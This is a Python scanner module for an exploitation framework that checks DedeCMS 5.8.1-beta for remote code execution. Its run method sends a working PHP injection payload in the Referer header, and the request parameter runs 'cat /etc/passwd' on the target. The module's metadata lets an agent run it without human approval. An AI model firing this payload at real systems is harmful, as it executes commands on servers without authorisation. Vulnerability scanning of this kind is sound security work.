#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DedeCMS 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DedeCMS 5.8.1-beta - Remote Code Execution Detection',
        'description': 'DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'dedecms', 'cms', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html',
            'https://sectime.top/post/1d114771.html',
        ],
    }

    def run(self):
        path = '/plus/flink.php?dopost=save&c=cat%20/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '<?php "system"($c);die;/*ref'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='DedeCMS 5.8.1-beta - Remote Code Execution detected', path=path)
            return True
        return False

